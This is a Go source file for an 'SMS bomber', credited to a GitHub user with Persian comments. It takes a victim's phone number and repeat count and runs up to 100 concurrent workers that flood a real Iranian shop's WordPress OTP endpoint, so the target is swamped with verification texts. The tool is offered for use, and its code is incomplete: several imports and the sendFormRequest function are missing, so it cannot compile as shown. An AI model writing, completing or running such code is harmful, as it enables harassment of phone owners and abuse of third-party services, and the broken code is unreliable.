//inja faghat kod ha ro test mikoni.


package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

/* import: 	net/url  strings
===============================================
Link Github : https://github.com/monsmain    
===============================================
Sms Bomber faster
*/
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}
func sms(url string, headers map[string]interface{}, ch chan<- int) {
	jsonData, err := json.Marshal(headers)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}

	time.Sleep(3 * time.Second)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	time.Sleep(3 * time.Second)

	if err != nil {
		fmt.Println("\033[01;31m[-] Error while sending request!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()

	ch <- resp.StatusCode
}
func main() {
	clearScreen()

	// ... (بخش چاپ لوگو - بدون تغییر)
	fmt.Print("\033[01;32m")
	fmt.Print(`
                                 :-.
                          .:  =#-:-----:
                            **%@#%@@@#*+==:
                        :=*%@@@@@@@@@@@@@@%#*=:
                     -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
                 . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
               .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
              =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
             :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
             #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
            .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
            =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
            +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
            =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
            .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
             #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
             -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:
              *@@%#            -@@@@@@.            #@@@+
              .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#
               :@@*           =%@@@@@@%-  faster   *@@:
               #@@%          .*@@@@#%@@@%+.        %@@+
               %@@@+      -#@@@@@* :%@@@@@*-      *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
               *@@@@#++*#%@@@@@@+   #@@@@@@%#+++%@@@@=
                #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
                 =%@@@@@@@@@@@@* :#+.#@@@@@@@@@@@@#-
                   .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
                      #@@@@@@@@@@@@@@@@@@@@@@+
                       *@@@@@@@@@@@@@@@@@@@@+
                        +@@%*@@%@@@%%@%*@@%=
                         +% %%.+@%:-@* *%-
                          . %# .%#  %+
                            :. %+ :.
                              -:
`)
	fmt.Print("\033[0m")
	// ... (پایان بخش چاپ لوگو)


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	// --- بخش جدید برای انتخاب سرعت ---
	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int // متغیر برای نگهداری تعداد کارگرها

	// تعیین تعداد کارگرها بر اساس انتخاب کاربر
	switch strings.ToLower(speedChoice) { // تبدیل ورودی به حروف کوچک برای مقایسه آسان‌تر
	case "fast":
		// مقداری بالاتر برای سیستم‌های قوی‌تر
		// این عدد رو می‌تونید با تست روی گوشی‌های قوی‌تر تنظیم کنید.
		// مثلاً چند برابر تعداد هسته‌های CPU یا یک عدد ثابت بالاتر.
		// runtime.NumCPU() * 4 یا یک عدد ثابت مثل 100 یا 150
		numWorkers = 100 // مثال: برای حالت سریع 100 کارگر
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":
		// مقداری محافظه‌کارانه برای سیستم‌های ضعیف‌تر یا حالت پیش‌فرض
		// یک عدد ثابت پایین‌تر
		numWorkers = 30 // مثال: برای حالت متوسط 30 کارگر
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:
		// اگر ورودی معتبر نبود، از حالت متوسط استفاده می‌کنیم
		numWorkers = 30 // پیش‌فرض به حالت متوسط
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}
	// --- پایان بخش جدید ---


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	// اندازه کانال وظایف می‌تواند بر اساس repeatCount و تعداد APIها باشد.
	// فعلاً بر اساس کد شما repeatCount * 40 باقی می‌ماند.
	tasks := make(chan func(), repeatCount*40)

	// numWorkers حالا بر اساس انتخاب کاربر تنظیم شده است
	// numWorkers := 20 // این خط دیگر لازم نیست

	var wg sync.WaitGroup
	// اندازه کانال نتایج هم بر اساس repeatCount * 40 باقی می‌ماند.
	ch := make(chan int, repeatCount*40)

	// ایجاد Goroutineهای کارگر با تعداد numWorkers تعیین شده
	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	// پر کردن کانال tasks با وظایف ارسال درخواست
	for i := 0; i < repeatCount; i++ {
		// 2. itmall.ir (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "digits_check_mob")
			formData.Set("countrycode", "+98")
			formData.Set("mobileNo", phone)
			formData.Set("csrf", "e57d035242")
			formData.Set("login", "2")
			formData.Set("username", "")
			formData.Set("email", "")
			formData.Set("captcha", "")
			formData.Set("captcha_ses", "")
			formData.Set("json", "1")
			formData.Set("whatsapp", "0")
			sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}
		// برای APIهای دیگر هم وظایف مشابه را اینجا اضافه می‌کنید
	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	// پردازش کدهای وضعیت
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
